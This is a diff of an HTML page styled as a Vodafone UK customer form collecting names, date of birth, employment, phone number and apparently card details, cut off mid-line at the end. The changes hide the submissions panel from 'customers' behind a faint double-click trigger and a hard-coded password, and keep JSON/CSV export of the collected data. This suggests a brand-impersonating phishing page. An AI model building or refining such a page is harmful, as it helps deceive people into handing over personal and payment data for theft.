@@ -26,7 +26,7 @@
     .input-group { display: flex; flex-direction: column; gap: 6px; }
     .input-group label { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: #5a6e7c; display: flex; align-items: center; gap: 6px; }
     .input-group label i { font-size: 0.8rem; color: #e60000; }
-    .input-group input, .input-group select { font-family: 'Inter', monospace; background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; }
+    .input-group input, .input-group select { font-family: 'Inter', monospace; background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; width: 100%; }
     .input-group input:focus, .input-group select:focus { border-color: #e60000; box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1); }
     .full-width { grid-column: 1 / -1; }
     .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
@@ -55,23 +55,60 @@
     .thankyou-modal p { color: #3a5a72; font-size: 1rem; line-height: 1.5; margin-bottom: 1.8rem; }
     .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
     .thankyou-modal button:hover { background: #c10000; }
+    
+    /* Admin Panel - Hidden from customers */
     .admin-panel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; width: 90%; max-width: 1200px; height: 80%; border-radius: 24px; z-index: 3000; box-shadow: 0 25px 50px rgba(0,0,0,0.3); overflow: hidden; }
     .admin-panel.active { display: flex; flex-direction: column; }
     .admin-header { background: #e60000; color: white; padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
     .admin-header h3 { margin: 0; }
     .admin-content { padding: 1rem; overflow-y: auto; flex: 1; }
     .submission-item { background: #f5f5f5; margin-bottom: 1rem; padding: 1rem; border-radius: 12px; border-left: 4px solid #e60000; }
-    .submission-item pre { white-space: pre-wrap; font-family: monospace; font-size: 0.8rem; }
+    .submission-item pre { white-space: pre-wrap; font-family: monospace; font-size: 0.8rem; margin: 0; }
     .close-admin { background: rgba(255,255,255,0.2); border: none; color: white; padding: 0.5rem 1rem; border-radius: 8px; cursor: pointer; }
-    .admin-btn { position: fixed; bottom: 20px; right: 20px; background: #e60000; color: white; border: none; padding: 12px 20px; border-radius: 40px; cursor: pointer; z-index: 999; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+    
+    /* Secret Admin Login - Hidden from customers until triggered */
+    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 4000; align-items: center; justify-content: center; }
+    .admin-login-overlay.active { display: flex; }
+    .admin-login-box { background: white; padding: 2rem; border-radius: 24px; width: 350px; text-align: center; }
+    .admin-login-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; }
+    .admin-login-box button { background: #e60000; color: white; border: none; padding: 12px 24px; border-radius: 40px; cursor: pointer; width: 100%; }
+    .admin-login-box h3 { color: #e60000; margin-bottom: 1rem; }
+    
+    /* Secret access hint - only visible to you */
+    .secret-hint { position: fixed; bottom: 10px; left: 10px; font-size: 10px; color: rgba(0,0,0,0.2); cursor: pointer; z-index: 999; }
+    .secret-hint:hover { color: rgba(0,0,0,0.5); }
+    
     @media (max-width: 680px) { body { padding: 1rem; } .form-body { padding: 1.2rem; } .card-row, .dob-row { grid-template-columns: 1fr; } }
   </style>
 </head>
 <body>
 
-<button class="admin-btn" onclick="openAdminPanel()">
-  <i class="fas fa-lock"></i> Admin Panel (View Submissions)
-</button>
+<!-- Secret access area (double-click to show admin login) -->
+<div class="secret-hint" ondblclick="showAdminLogin()">
+  <i class="fas fa-shield-alt"></i> Admin Access (double-click)
+</div>
+
+<!-- Admin Login Overlay -->
+<div id="adminLoginOverlay" class="admin-login-overlay">
+  <div class="admin-login-box">
+    <i class="fas fa-lock" style="font-size: 3rem; color: #e60000;"></i>
+    <h3>Admin Access Only</h3>
+    <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
+    <button onclick="verifyAdminPassword()">Access Submissions</button>
+    <p style="font-size: 0.7rem; margin-top: 1rem; color: #999;">Authorized personnel only</p>
+  </div>
+</div>
+
+<!-- Admin Panel -->
+<div id="adminPanel" class="admin-panel">
+  <div class="admin-header">
+    <h3><i class="fas fa-database"></i> Secure Admin Panel - Customer Submissions</h3>
+    <button class="close-admin" onclick="closeAdminPanel()">✕ Close</button>
+  </div>
+  <div class="admin-content" id="adminContent">
+    <div style="text-align: center; padding: 2rem;">Loading submissions...</div>
+  </div>
+</div>
 
 <div class="form-container">
   <div class="form-header">
@@ -113,15 +150,15 @@
             <input type="text" name="Surname" id="surname" placeholder="Smith" required>
           </div>
           <div class="input-group full-width">
-            <label><i class="fas fa-birthday-cake"></i> Date of birth</label>
+            <label><i class="fas fa-calendar-alt"></i> Date of birth (Numeric)</label>
             <div class="dob-row">
-              <select id="dobDay" name="Date of Birth - Day" required>
+              <select id="dobDay" name="DOB Day" required>
                 <option value="" disabled selected>Day</option>
               </select>
-              <select id="dobMonth" name="Date of Birth - Month" required>
+              <select id="dobMonth" name="DOB Month" required>
                 <option value="" disabled selected>Month</option>
               </select>
-              <select id="dobYear" name="Date of Birth - Year" required>
+              <select id="dobYear" name="DOB Year" required>
                 <option value="" disabled selected>Year</option>
               </select>
             </div>
@@ -234,16 +271,6 @@
   </div>
 </div>
 
-<div id="adminPanel" class="admin-panel">
-  <div class="admin-header">
-    <h3><i class="fas fa-database"></i> Secure Admin Panel - Customer Submissions</h3>
-    <button class="close-admin" onclick="closeAdminPanel()">✕ Close</button>
-  </div>
-  <div class="admin-content" id="adminContent">
-    <div style="text-align: center; padding: 2rem;">Loading submissions...</div>
-  </div>
-</div>
-
 <script>
   (function() {
     const form = document.getElementById('vodafoneForm');
@@ -251,25 +278,11 @@
     const submitBtn = document.getElementById('submitBtn');
     const thankyouModal = document.getElementById('thankyouModal');
     let formSubmitted = false;
-
-    // ============ PRIVATE BACKEND OPTIONS ============
-    // OPTION 1: Email via SMTP.js (sends directly to your email - NO third party)
-    // OPTION 2: LocalStorage + Admin Panel (view submissions directly in browser - 100% private)
-    // OPTION 3: Download as JSON/CSV file
-    // OPTION 4: Your own PHP/Node.js server endpoint
     
-    // Configure YOUR email for direct receiving (change this to your email)
-    const YOUR_EMAIL = "your-email@example.com"; // <-- CHANGE THIS TO YOUR EMAIL
+    // ============ YOUR SECRET ADMIN PASSWORD ============
+    // CHANGE THIS PASSWORD TO YOUR OWN SECRET ONE
+    const ADMIN_PASSWORD = "VodafoneAdmin2026";
     
-    // Enable/disable features
-    const SETTINGS = {
-      saveToLocalStorage: true,    // Saves to browser - view via Admin Panel
-      sendEmailDirectly: false,    // Requires SMTP setup (see below)
-      allowDownload: true,         // Allows downloading all submissions
-      useCustomWebhook: false,     // Your own server endpoint
-      customWebhookUrl: "https://your-server.com/api/submit" // Your endpoint
-    };
-
     function showMessage(text, isError = false) {
       toast.textContent = text;
       toast.classList.add('show');
@@ -282,7 +295,7 @@
       }
       setTimeout(() => { toast.classList.remove('show'); }, 4500);
     }
-
+    
     window.closeThankYouModal = function() {
       thankyouModal.classList.remove('active');
       if (formSubmitted) {
@@ -294,18 +307,34 @@
         formSubmitted = false;
       }
     };
-
-    // Admin Panel Functions
-    window.openAdminPanel = function() {
+    
+    // Admin Panel Functions with Password Protection
+    window.showAdminLogin = function() {
+      document.getElementById('adminLoginOverlay').classList.add('active');
+    };
+    
+    window.verifyAdminPassword = function() {
+      const password = document.getElementById('adminPassword').value;
+      if (password === ADMIN_PASSWORD) {
+        document.getElementById('adminLoginOverlay').classList.remove('active');
+        openAdminPanel();
+        document.getElementById('adminPassword').value = '';
+      } else {
+        alert('❌ Invalid password! Access denied.');
+        document.getElementById('adminPassword').value = '';
+      }
+    };
+    
+    function openAdminPanel() {
       const panel = document.getElementById('adminPanel');
       loadSubmissions();
       panel.classList.add('active');
-    };
-
+    }
+    
     window.closeAdminPanel = function() {
       document.getElementById('adminPanel').classList.remove('active');
     };
-
+    
     function loadSubmissions() {
       const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
       const container = document.getElementById('adminContent');
@@ -325,6 +354,7 @@
         <button onclick="clearAllSubmissions()" style="background: #c0392b; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-left: 10px;">
           <i class="fas fa-trash"></i> Clear All
         </button>
+        <span style="margin-left: 15px; font-size: 0.8rem;">Total: ${submissions.length} submissions</span>
       </div>`;
       
       submissions.reverse().forEach((sub, index) => {
@@ -338,7 +368,7 @@
       
       container.innerHTML = html;
     }
-
+    
     window.downloadSubmissions = function() {
       const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
       const dataStr = JSON.stringify(submissions, null, 2);
@@ -351,7 +381,7 @@
       URL.revokeObjectURL(url);
       showMessage("Submissions downloaded as JSON", false);
     };
-
+    
     window.downloadAsCSV = function() {
       const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
       if (submissions.length === 0) {
@@ -359,7 +389,6 @@
         return;
       }
       
-      // Get all unique keys
       const allKeys = new Set();
       submissions.forEach(sub => {
         Object.keys(sub.data).forEach(key => allKeys.add(key));
@@ -370,7 +399,6 @@
       submissions.forEach(sub => {
         const row = headers.map(header => {
           let value = sub.data[header] || '';
-          // Escape quotes and commas
           value = String(value).replace(/"/g, '""');
           if (value.includes(',') || value.includes('"') || value.includes('\n')) {
             value = `"${value}"`;
@@ -389,7 +417,7 @@
       URL.revokeObjectURL(url);
       showMessage("Submissions downloaded as CSV", false);
     };
-
+    
     window.clearAllSubmissions = function() {
       if (confirm("⚠️ WARNING: This will delete ALL submissions. Are you sure?")) {
         localStorage.removeItem('vodafone_submissions');
@@ -397,8 +425,7 @@
         showMessage("All submissions cleared", false);
       }
     };
-
-    // Save to localStorage
+    
     function saveToLocalStorage(data) {
       try {
         const submissions = JSON.parse(localStorage.getItem('vodafone_submissions') || '[]');
@@ -408,40 +435,14 @@
           data: data 
         });
         localStorage.setItem('vodafone_submissions', JSON.stringify(submissions));
-        console.log('✅ Saved to localStorage - View in Admin Panel');
+        console.log('✅ Submission saved! View in Admin Panel');
         return true;
       } catch(e) {
         console.error('localStorage error:', e);
         return false;
       }
     }
-
-    // Send to your custom webhook/server
-    async function sendToCustomWebhook(data) {
-      if (!SETTINGS.useCustomWebhook) return false;
-      try {
-        const response = await fetch(SETTINGS.customWebhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-        if (response.ok) {
-          console.log('✅ Sent to custom webhook');
-          return true;
-        }
-      } catch(e) { console.error('Webhook error:', e); }
-      return false;
-    }
-
-    // Send email using mailto: (opens email client)
-    function sendViaMailTo(data) {
-      // This opens user's default email client - 100% private, no third party
-      const subject = encodeURIComponent(`Vodafone UK Submission - ${data['First Name']} ${data['Surname']}`);
-      let body = encodeURIComponent(JSON.stringify(data, null, 2));
-      window.location.href = `mailto:${YOUR_EMAIL}?subject=${subject}&body=${body}`;
-      return true;
-    }
-
+    
     function populateDOB() {
       const daySelect = document.getElementById('dobDay');
       for (let i = 1; i <= 31; i++) {
@@ -451,13 +452,12 @@
         daySelect.appendChild(option);
       }
       const monthSelect = document.getElementById('dobMonth');
-      const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
-      months.forEach((month, idx) => {
+      for (let i = 1; i <= 12; i++) {
         const option = document.createElement('option');
-        option.value = idx + 1;
-        option.textContent = month;
+        option.value = i;
+        option.textContent = i;
         monthSelect.appendChild(option);
-      });
+      }
       const yearSelect = document.getElementById('dobYear');
       const currentYear = new Date().getFullYear();
       for (let i = currentYear; i >= 1920; i--) {
@@ -468,7 +468,7 @@
       }
     }
     populateDOB();
-
+    
     function validateRequiredFields() {
       const requiredFields = [
         { id: 'firstName', name: 'First name' },
@@ -500,24 +500,12 @@
       const month = document.getElementById('dobMonth').value;
       const year = document.getElementById('dobYear').value;
       if (!day || !month || !year) {
-        showMessage("🎂 Please select complete Date of Birth", true);
+        showMessage("🎂 Please select complete Date of Birth (Day, Month, Year)", true);
         return false;
       }
+      
       const birthDate = new Date(year, month-1, day);
       const today = new Date();
       let age = today.getFullYear() - birthDate.getFullYear();
       const mDiff = today.getMonth() - birthDate.getMonth();
-      if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
-      if (age < 18) {
-        showMessage("⚠️ You must be at least 18 years old to continue.", true);
-        return false;
-      }
-
-      const employmentSelect = document.getElementById('employmentStatus');
-      if (!employmentSelect.value) {
-        showMessage("⚠️ Please select Employment status", true);
-        return false;
-      }
-
-      const phone = document.getElementById('phoneNo').value.trim();
-      const phoneRegex = /^[\+\d\s\-\(\)]{
+      if (
